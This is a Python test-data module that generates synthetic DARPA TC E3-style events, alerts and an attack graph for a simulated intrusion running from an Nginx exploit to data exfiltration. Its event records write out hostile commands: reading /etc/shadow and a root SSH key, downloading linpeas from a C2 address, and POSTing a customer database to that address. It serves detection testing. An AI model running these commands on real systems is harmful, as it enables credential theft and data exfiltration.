"""
DARPA TC E3 (CADETS) 风格测试数据集

模拟场景：
- 攻击者 (10.10.0.10) 利用 Nginx 漏洞入侵 webserver01
- 通过 Web Shell 执行命令
- 横向移动到 coreserver01
- 与 C2 服务器 (10.10.0.20) 通信
- 数据外传

参考：DARPA Transparent Computing E3 CADETS 数据集
"""

from typing import List, Dict, Any


def get_darpa_e3_events() -> List[Dict[str, Any]]:
    """生成 DARPA TC E3 风格的 NormalizedEvent 数据。"""
    return [
        # ============================================================
        # 阶段 1: 初始入侵 - Nginx 漏洞利用
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0001",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:20:15+08:00",
            "source_type": "boundary_log",
            "source": "firewall",
            "host_id": "firewall01",
            "src_ip": "10.10.0.10",
            "src_port": 49832,
            "dst_ip": "10.10.1.10",
            "dst_port": 80,
            "user": None,
            "action": "network_connect",
            "process": None,
            "object": None,
            "network": {
                "protocol": "tcp",
                "direction": "inbound",
                "bytes_in": 2048,
                "bytes_out": 512,
                "session_id": "sess_e3_001"
            },
            "raw_event": {
                "attack_stage": "initial_access",
                "technique": "T1190",
                "description": "Exploit Public-Facing Application - Nginx vulnerability"
            },
            "labels": ["initial_access", "exploit", "nginx"],
            "metadata": {"source_dataset": "darpa_tc_e3_cadets"}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0002",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:20:18+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "process_create",
            "process": {
                "pid": 12341,
                "ppid": 1200,
                "name": "sh",
                "path": "/bin/sh",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "sh",
                "path": "/bin/sh"
            },
            "network": None,
            "raw_event": {
                "command_line": "sh -c id",
                "attack_stage": "execution",
                "technique": "T1059.004"
            },
            "labels": ["process_create", "shell", "post_exploit"],
            "metadata": {"parent_process": "nginx"}
        },
        # ============================================================
        # 阶段 2: Web Shell 植入
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0003",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:21:02+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "file_create",
            "process": {
                "pid": 12341,
                "ppid": 1200,
                "name": "sh",
                "path": "/bin/sh",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "shell.php",
                "path": "/var/www/html/uploads/shell.php"
            },
            "network": None,
            "raw_event": {
                "file_hash": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2",
                "attack_stage": "persistence",
                "technique": "T1505.003",
                "description": "Web Shell deployment"
            },
            "labels": ["file_create", "web_shell", "persistence"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 3: 通过 Web Shell 执行命令（侦察）
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0004",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:22:30+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "process_create",
            "process": {
                "pid": 12400,
                "ppid": 12341,
                "name": "whoami",
                "path": "/usr/bin/whoami",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "whoami",
                "path": "/usr/bin/whoami"
            },
            "network": None,
            "raw_event": {
                "command_line": "whoami",
                "attack_stage": "discovery",
                "technique": "T1033"
            },
            "labels": ["process_create", "reconnaissance", "whoami"],
            "metadata": {}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0005",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:22:35+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "process_create",
            "process": {
                "pid": 12401,
                "ppid": 12341,
                "name": "uname",
                "path": "/usr/bin/uname",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "uname",
                "path": "/usr/bin/uname"
            },
            "network": None,
            "raw_event": {
                "command_line": "uname -a",
                "attack_stage": "discovery",
                "technique": "T1082"
            },
            "labels": ["process_create", "reconnaissance"],
            "metadata": {}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0006",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:23:10+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "process_create",
            "process": {
                "pid": 12402,
                "ppid": 12341,
                "name": "cat",
                "path": "/bin/cat",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "passwd",
                "path": "/etc/passwd"
            },
            "network": None,
            "raw_event": {
                "command_line": "cat /etc/passwd",
                "attack_stage": "credential_access",
                "technique": "T1005"
            },
            "labels": ["file_read", "credential_access", "sensitive_file"],
            "metadata": {}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0007",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:23:45+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "www-data",
            "action": "process_create",
            "process": {
                "pid": 12403,
                "ppid": 12341,
                "name": "cat",
                "path": "/bin/cat",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "shadow",
                "path": "/etc/shadow"
            },
            "network": None,
            "raw_event": {
                "command_line": "cat /etc/shadow",
                "attack_stage": "credential_access",
                "technique": "T1003.008"
            },
            "labels": ["file_read", "credential_access", "shadow_file"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 4: C2 通信建立
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0008",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:25:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": "10.10.1.10",
            "src_port": 48231,
            "dst_ip": "10.10.0.20",
            "dst_port": 443,
            "user": "www-data",
            "action": "network_connect",
            "process": {
                "pid": 12410,
                "ppid": 12341,
                "name": "curl",
                "path": "/usr/bin/curl",
                "hash_sha256": None
            },
            "object": None,
            "network": {
                "protocol": "tcp",
                "direction": "outbound",
                "bytes_in": 1024,
                "bytes_out": 256,
                "session_id": "sess_e3_c2_001"
            },
            "raw_event": {
                "command_line": "curl -k https://10.10.0.20/beacon",
                "attack_stage": "command_and_control",
                "technique": "T1071.001",
                "domain": "c2server01.local"
            },
            "labels": ["c2_communication", "beacon", "https"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 5: 工具下载
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0009",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:26:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": "10.10.1.10",
            "src_port": 48232,
            "dst_ip": "10.10.0.20",
            "dst_port": 443,
            "user": "www-data",
            "action": "file_create",
            "process": {
                "pid": 12410,
                "ppid": 12341,
                "name": "curl",
                "path": "/usr/bin/curl",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "linpeas.sh",
                "path": "/tmp/.hidden/linpeas.sh"
            },
            "network": {
                "protocol": "tcp",
                "direction": "outbound",
                "bytes_in": 45678,
                "bytes_out": 128,
                "session_id": "sess_e3_c2_002"
            },
            "raw_event": {
                "command_line": "curl -k https://10.10.0.20/tools/linpeas.sh -o /tmp/.hidden/linpeas.sh",
                "file_hash": "b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3",
                "attack_stage": "command_and_control",
                "technique": "T1105",
                "description": "Ingress Tool Transfer - linpeas privilege escalation enumeration"
            },
            "labels": ["file_create", "tool_download", "linpeas"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 6: 权限提升
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0010",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:30:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "root",
            "action": "process_create",
            "process": {
                "pid": 12500,
                "ppid": 12410,
                "name": "bash",
                "path": "/bin/bash",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "bash",
                "path": "/bin/bash"
            },
            "network": None,
            "raw_event": {
                "command_line": "bash -i",
                "attack_stage": "privilege_escalation",
                "technique": "T1068",
                "description": "Exploitation for Privilege Escalation via kernel vulnerability"
            },
            "labels": ["process_create", "privilege_escalation", "root_shell"],
            "metadata": {"escalated_from": "www-data", "escalated_to": "root"}
        },
        # ============================================================
        # 阶段 7: 凭据收集
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0011",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:32:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "root",
            "action": "process_create",
            "process": {
                "pid": 12510,
                "ppid": 12500,
                "name": "cat",
                "path": "/bin/cat",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "id_rsa",
                "path": "/root/.ssh/id_rsa"
            },
            "network": None,
            "raw_event": {
                "command_line": "cat /root/.ssh/id_rsa",
                "attack_stage": "credential_access",
                "technique": "T1552.004",
                "description": "Unsecured Credentials: Private Keys"
            },
            "labels": ["file_read", "credential_access", "ssh_key"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 8: 横向移动到 coreserver01
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0012",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:35:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": "10.10.1.10",
            "src_port": 48400,
            "dst_ip": "10.10.3.10",
            "dst_port": 22,
            "user": "root",
            "action": "network_connect",
            "process": {
                "pid": 12520,
                "ppid": 12500,
                "name": "ssh",
                "path": "/usr/bin/ssh",
                "hash_sha256": None
            },
            "object": None,
            "network": {
                "protocol": "tcp",
                "direction": "outbound",
                "bytes_in": 8192,
                "bytes_out": 4096,
                "session_id": "sess_e3_lateral_001"
            },
            "raw_event": {
                "command_line": "ssh -i /root/.ssh/id_rsa admin@10.10.3.10",
                "attack_stage": "lateral_movement",
                "technique": "T1021.004",
                "description": "Remote Services: SSH"
            },
            "labels": ["lateral_movement", "ssh", "credential_reuse"],
            "metadata": {}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0013",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:35:05+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "coreserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "admin",
            "action": "process_create",
            "process": {
                "pid": 8800,
                "ppid": 1,
                "name": "bash",
                "path": "/bin/bash",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "bash",
                "path": "/bin/bash"
            },
            "network": None,
            "raw_event": {
                "command_line": "bash -i",
                "attack_stage": "lateral_movement",
                "technique": "T1021.004"
            },
            "labels": ["process_create", "lateral_movement", "ssh_session"],
            "metadata": {"source_host": "webserver01", "source_ip": "10.10.1.10"}
        },
        # ============================================================
        # 阶段 9: 在 coreserver01 上侦察
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0014",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:36:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "coreserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "admin",
            "action": "process_create",
            "process": {
                "pid": 8810,
                "ppid": 8800,
                "name": "ifconfig",
                "path": "/sbin/ifconfig",
                "hash_sha256": None
            },
            "object": {
                "type": "process",
                "name": "ifconfig",
                "path": "/sbin/ifconfig"
            },
            "network": None,
            "raw_event": {
                "command_line": "ifconfig -a",
                "attack_stage": "discovery",
                "technique": "T1016"
            },
            "labels": ["process_create", "reconnaissance", "network_discovery"],
            "metadata": {}
        },
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0015",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:36:30+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "coreserver01",
            "src_ip": None,
            "src_port": None,
            "dst_ip": None,
            "dst_port": None,
            "user": "admin",
            "action": "process_create",
            "process": {
                "pid": 8811,
                "ppid": 8800,
                "name": "find",
                "path": "/usr/bin/find",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "database",
                "path": "/opt/app/database"
            },
            "network": None,
            "raw_event": {
                "command_line": "find /opt/app -name '*.db' -o -name '*.sql'",
                "attack_stage": "discovery",
                "technique": "T1083"
            },
            "labels": ["file_access", "discovery", "database_search"],
            "metadata": {}
        },
        # ============================================================
        # 阶段 10: 数据外传
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0016",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:40:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "coreserver01",
            "src_ip": "10.10.3.10",
            "src_port": 49100,
            "dst_ip": "10.10.0.20",
            "dst_port": 443,
            "user": "admin",
            "action": "network_connect",
            "process": {
                "pid": 8820,
                "ppid": 8800,
                "name": "curl",
                "path": "/usr/bin/curl",
                "hash_sha256": None
            },
            "object": {
                "type": "file",
                "name": "customers.sql",
                "path": "/opt/app/database/customers.sql"
            },
            "network": {
                "protocol": "tcp",
                "direction": "outbound",
                "bytes_in": 512,
                "bytes_out": 2048000,
                "session_id": "sess_e3_exfil_001"
            },
            "raw_event": {
                "command_line": "curl -k -X POST https://10.10.0.20/upload -d @/opt/app/database/customers.sql",
                "attack_stage": "exfiltration",
                "technique": "T1041",
                "description": "Exfiltration Over C2 Channel"
            },
            "labels": ["data_exfiltration", "c2_upload", "database_theft"],
            "metadata": {"data_size": 2048000, "data_type": "database"}
        },
        # ============================================================
        # 持续 C2 通信（beacon）
        # ============================================================
        {
            "schema_version": "1.0",
            "event_id": "evt_e3_0017",
            "task_id": "task_darpa_e3_001",
            "timestamp": "2024-03-06T11:45:00+08:00",
            "source_type": "host_behavior",
            "source": "auditd",
            "host_id": "webserver01",
            "src_ip": "10.10.1.10",
            "src_port": 48500,
            "dst_ip": "10.10.0.20",
            "dst_port": 443,
            "user": "www-data",
            "action": "network_connect",
            "process": {
                "pid": 12410,
                "ppid": 12341,
                "name": "curl",
                "path": "/usr/bin/curl",
                "hash_sha256": None
            },
            "object": None,
            "network": {
                "protocol": "tcp",
                "direction": "outbound",
                "bytes_in": 256,
                "bytes_out": 128,
                "session_id": "sess_e3_beacon_003"
            },
            "raw_event": {
                "command_line": "curl -k https://10.10.0.20/check",
                "attack_stage": "command_and_control",
                "technique": "T1071.001"
            },
            "labels": ["c2_communication", "beacon", "periodic"],
            "metadata": {}
        },
    ]


def get_darpa_e3_alerts() -> List[Dict[str, Any]]:
    """生成 DARPA TC E3 风格的告警数据。"""
    return [
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0001",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:20:15+08:00",
            "timestamp_end": "2024-03-06T11:20:18+08:00",
            "event_ids": ["evt_e3_0001", "evt_e3_0002"],
            "host_ids": ["firewall01", "webserver01"],
            "severity": "critical",
            "rule_id": "DET-INIT-001",
            "rule_name": "Nginx Exploit Detected",
            "description": "Detected exploitation of Nginx vulnerability CVE-2021-23017. "
                          "External IP 10.10.0.10 connected to web server followed by shell spawn.",
            "mitre": {
                "tactic": "Initial Access",
                "technique_id": "T1190",
                "technique_name": "Exploit Public-Facing Application",
                "subtechnique_id": None
            },
            "confidence": 0.95,
            "evidence_summary": "Firewall inbound connection from 10.10.0.10:49832 to 10.10.1.10:80 "
                              "immediately followed by /bin/sh process creation under www-data.",
            "detector": "rule-engine",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0002",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:21:02+08:00",
            "timestamp_end": None,
            "event_ids": ["evt_e3_0003"],
            "host_ids": ["webserver01"],
            "severity": "high",
            "rule_id": "DET-PERSIST-001",
            "rule_name": "Web Shell Deployment",
            "description": "File creation in web-accessible directory with suspicious PHP content. "
                          "Likely web shell deployment for persistent access.",
            "mitre": {
                "tactic": "Persistence",
                "technique_id": "T1505.003",
                "technique_name": "Web Shell",
                "subtechnique_id": None
            },
            "confidence": 0.90,
            "evidence_summary": "PHP file created in /var/www/html/uploads/ by www-data user "
                              "with hash a1b2c3d4... indicating known web shell.",
            "detector": "file-integrity-monitor",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0003",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:22:30+08:00",
            "timestamp_end": "2024-03-06T11:23:45+08:00",
            "event_ids": ["evt_e3_0004", "evt_e3_0005", "evt_e3_0006", "evt_e3_0007"],
            "host_ids": ["webserver01"],
            "severity": "medium",
            "rule_id": "DET-RECON-001",
            "rule_name": "Post-Exploitation Reconnaissance",
            "description": "Rapid sequence of system discovery commands executed by web server process. "
                          "Pattern consistent with post-exploitation enumeration.",
            "mitre": {
                "tactic": "Discovery",
                "technique_id": "T1082",
                "technique_name": "System Information Discovery",
                "subtechnique_id": None
            },
            "confidence": 0.85,
            "evidence_summary": "Sequence of whoami, uname -a, cat /etc/passwd, cat /etc/shadow "
                              "executed within 90 seconds by child processes of nginx worker.",
            "detector": "behavior-analysis",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0004",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:25:00+08:00",
            "timestamp_end": "2024-03-06T11:45:00+08:00",
            "event_ids": ["evt_e3_0008", "evt_e3_0017"],
            "host_ids": ["webserver01"],
            "severity": "high",
            "rule_id": "DET-C2-001",
            "rule_name": "C2 Beacon Communication",
            "description": "Periodic HTTPS connections to external C2 server detected. "
                          "Pattern indicates beacon/check-in behavior.",
            "mitre": {
                "tactic": "Command and Control",
                "technique_id": "T1071.001",
                "technique_name": "Web Protocols",
                "subtechnique_id": None
            },
            "confidence": 0.88,
            "evidence_summary": "Multiple HTTPS connections from webserver01 to 10.10.0.20:443 "
                              "at regular intervals with small payload sizes typical of beaconing.",
            "detector": "network-anomaly",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0005",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:30:00+08:00",
            "timestamp_end": None,
            "event_ids": ["evt_e3_0010"],
            "host_ids": ["webserver01"],
            "severity": "critical",
            "rule_id": "DET-PRIVESC-001",
            "rule_name": "Privilege Escalation to Root",
            "description": "Process spawned as root from previously compromised www-data context. "
                          "Indicates successful privilege escalation.",
            "mitre": {
                "tactic": "Privilege Escalation",
                "technique_id": "T1068",
                "technique_name": "Exploitation for Privilege Escalation",
                "subtechnique_id": None
            },
            "confidence": 0.92,
            "evidence_summary": "bash process spawned as root with parent PID belonging to www-data "
                              "context, indicating exploitation for privilege escalation.",
            "detector": "behavior-analysis",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0006",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:35:00+08:00",
            "timestamp_end": "2024-03-06T11:35:05+08:00",
            "event_ids": ["evt_e3_0012", "evt_e3_0013"],
            "host_ids": ["webserver01", "coreserver01"],
            "severity": "critical",
            "rule_id": "DET-LATERAL-001",
            "rule_name": "SSH Lateral Movement",
            "description": "SSH connection from compromised web server to core server using "
                          "stolen credentials. Indicates lateral movement.",
            "mitre": {
                "tactic": "Lateral Movement",
                "technique_id": "T1021.004",
                "technique_name": "SSH",
                "subtechnique_id": None
            },
            "confidence": 0.93,
            "evidence_summary": "SSH connection from webserver01 (10.10.1.10) to coreserver01 (10.10.3.10) "
                              "using root credentials, immediately followed by interactive shell on target.",
            "detector": "network-correlation",
            "status": "confirmed"
        },
        {
            "schema_version": "1.0",
            "alert_id": "alert_e3_0007",
            "task_id": "task_darpa_e3_001",
            "timestamp_start": "2024-03-06T11:40:00+08:00",
            "timestamp_end": None,
            "event_ids": ["evt_e3_0016"],
            "host_ids": ["coreserver01"],
            "severity": "critical",
            "rule_id": "DET-EXFIL-001",
            "rule_name": "Data Exfiltration to C2",
            "description": "Large outbound data transfer from core server to C2 server. "
                          "Database file likely being exfiltrated.",
            "mitre": {
                "tactic": "Exfiltration",
                "technique_id": "T1041",
                "technique_name": "Exfiltration Over C2 Channel",
                "subtechnique_id": None
            },
            "confidence": 0.91,
            "evidence_summary": "2MB outbound POST request from coreserver01 to C2 server 10.10.0.20 "
                              "containing database content from /opt/app/database/customers.sql.",
            "detector": "data-loss-prevention",
            "status": "confirmed"
        },
    ]


def get_darpa_e3_attack_graph() -> Dict[str, Any]:
    """生成 DARPA TC E3 风格的攻击图。"""
    return {
        "schema_version": "1.0",
        "graph_id": "graph_darpa_e3_001",
        "task_id": "task_darpa_e3_001",
        "generated_at": "2024-03-06T12:00:00+08:00",
        "nodes": [
            {
                "id": "attacker01",
                "type": "host",
                "label": "External Attacker",
                "attributes": {"ip": "10.10.0.10", "zone": "external", "role": "attacker"}
            },
            {
                "id": "c2server01",
                "type": "c2",
                "label": "C2 Server",
                "attributes": {"ip": "10.10.0.20", "zone": "external", "domain": "c2server01.local"}
            },
            {
                "id": "firewall01",
                "type": "host",
                "label": "Firewall",
                "attributes": {"ip": "10.10.0.1", "zone": "boundary", "role": "firewall"}
            },
            {
                "id": "webserver01",
                "type": "host",
                "label": "Web Server (Nginx)",
                "attributes": {"ip": "10.10.1.10", "zone": "dmz", "role": "web_server", "os": "linux"}
            },
            {
                "id": "coreserver01",
                "type": "host",
                "label": "Core Server",
                "attributes": {"ip": "10.10.3.10", "zone": "server", "role": "core_server", "os": "linux"}
            },
            {
                "id": "webshell01",
                "type": "file",
                "label": "shell.php",
                "attributes": {"path": "/var/www/html/uploads/shell.php", "hash": "a1b2c3d4..."}
            },
            {
                "id": "proc_nginx",
                "type": "process",
                "label": "nginx worker",
                "attributes": {"pid": 1200, "user": "www-data"}
            },
            {
                "id": "proc_shell",
                "type": "process",
                "label": "sh",
                "attributes": {"pid": 12341, "user": "www-data", "path": "/bin/sh"}
            },
            {
                "id": "proc_root_shell",
                "type": "process",
                "label": "bash (root)",
                "attributes": {"pid": 12500, "user": "root", "path": "/bin/bash"}
            },
            {
                "id": "proc_ssh",
                "type": "process",
                "label": "ssh client",
                "attributes": {"pid": 12520, "user": "root", "path": "/usr/bin/ssh"}
            },
            {
                "id": "proc_coreshell",
                "type": "process",
                "label": "bash (admin@coreserver)",
                "attributes": {"pid": 8800, "user": "admin", "host": "coreserver01"}
            },
            {
                "id": "ssh_key",
                "type": "file",
                "label": "id_rsa",
                "attributes": {"path": "/root/.ssh/id_rsa"}
            },
            {
                "id": "database_file",
                "type": "file",
                "label": "customers.sql",
                "attributes": {"path": "/opt/app/database/customers.sql"}
            },
        ],
        "edges": [
            # 初始入侵
            {
                "id": "edge_001",
                "source": "attacker01",
                "target": "webserver01",
                "relation": "initial_access",
                "timestamp": "2024-03-06T11:20:15+08:00",
                "technique_id": "T1190",
                "evidence_event_ids": ["evt_e3_0001"],
                "evidence_alert_ids": ["alert_e3_0001"],
                "confidence": 0.95,
                "attributes": {"description": "Nginx exploit"}
            },
            # 进程创建链
            {
                "id": "edge_002",
                "source": "proc_nginx",
                "target": "proc_shell",
                "relation": "process_spawn",
                "timestamp": "2024-03-06T11:20:18+08:00",
                "technique_id": "T1059.004",
                "evidence_event_ids": ["evt_e3_0002"],
                "evidence_alert_ids": [],
                "confidence": 0.9,
                "attributes": {"description": "Shell spawned by nginx"}
            },
            # Web Shell 写入
            {
                "id": "edge_003",
                "source": "proc_shell",
                "target": "webshell01",
                "relation": "file_access",
                "timestamp": "2024-03-06T11:21:02+08:00",
                "technique_id": "T1505.003",
                "evidence_event_ids": ["evt_e3_0003"],
                "evidence_alert_ids": ["alert_e3_0002"],
                "confidence": 0.9,
                "attributes": {"description": "Web shell deployment"}
            },
            # 侦察
            {
                "id": "edge_004",
                "source": "proc_shell",
                "target": "webserver01",
                "relation": "data_access",
                "timestamp": "2024-03-06T11:22:30+08:00",
                "technique_id": "T1082",
                "evidence_event_ids": ["evt_e3_0004", "evt_e3_0005", "evt_e3_0006", "evt_e3_0007"],
                "evidence_alert_ids": ["alert_e3_0003"],
                "confidence": 0.85,
                "attributes": {"description": "System reconnaissance"}
            },
            # C2 通信
            {
                "id": "edge_005",
                "source": "webserver01",
                "target": "c2server01",
                "relation": "c2_communication",
                "timestamp": "2024-03-06T11:25:00+08:00",
                "technique_id": "T1071.001",
                "evidence_event_ids": ["evt_e3_0008", "evt_e3_0017"],
                "evidence_alert_ids": ["alert_e3_0004"],
                "confidence": 0.88,
                "attributes": {"description": "C2 beacon over HTTPS"}
            },
            # 工具下载
            {
                "id": "edge_006",
                "source": "c2server01",
                "target": "webserver01",
                "relation": "network_connect",
                "timestamp": "2024-03-06T11:26:00+08:00",
                "technique_id": "T1105",
                "evidence_event_ids": ["evt_e3_0009"],
                "evidence_alert_ids": [],
                "confidence": 0.85,
                "attributes": {"description": "Tool download (linpeas)"}
            },
            # 权限提升
            {
                "id": "edge_007",
                "source": "proc_shell",
                "target": "proc_root_shell",
                "relation": "privilege_escalation",
                "timestamp": "2024-03-06T11:30:00+08:00",
                "technique_id": "T1068",
                "evidence_event_ids": ["evt_e3_0010"],
                "evidence_alert_ids": ["alert_e3_0005"],
                "confidence": 0.92,
                "attributes": {"description": "Kernel exploit privesc"}
            },
            # SSH 密钥窃取
            {
                "id": "edge_008",
                "source": "proc_root_shell",
                "target": "ssh_key",
                "relation": "file_access",
                "timestamp": "2024-03-06T11:32:00+08:00",
                "technique_id": "T1552.004",
                "evidence_event_ids": ["evt_e3_0011"],
                "evidence_alert_ids": [],
                "confidence": 0.9,
                "attributes": {"description": "SSH private key theft"}
            },
            # 横向移动
            {
                "id": "edge_009",
                "source": "webserver01",
                "target": "coreserver01",
                "relation": "lateral_movement",
                "timestamp": "2024-03-06T11:35:00+08:00",
                "technique_id": "T1021.004",
                "evidence_event_ids": ["evt_e3_0012", "evt_e3_0013"],
                "evidence_alert_ids": ["alert_e3_0006"],
                "confidence": 0.93,
                "attributes": {"description": "SSH lateral movement with stolen key"}
            },
            # 数据访问
            {
                "id": "edge_010",
                "source": "proc_coreshell",
                "target": "database_file",
                "relation": "file_access",
                "timestamp": "2024-03-06T11:36:30+08:00",
                "technique_id": "T1083",
                "evidence_event_ids": ["evt_e3_0014", "evt_e3_0015"],
                "evidence_alert_ids": [],
                "confidence": 0.85,
                "attributes": {"description": "Database file discovery"}
            },
            # 数据外传
            {
                "id": "edge_011",
                "source": "coreserver01",
                "target": "c2server01",
                "relation": "data_exfiltration",
                "timestamp": "2024-03-06T11:40:00+08:00",
                "technique_id": "T1041",
                "evidence_event_ids": ["evt_e3_0016"],
                "evidence_alert_ids": ["alert_e3_0007"],
                "confidence": 0.91,
                "attributes": {"description": "Database exfiltration to C2", "data_size": 2048000}
            },
        ]
    }
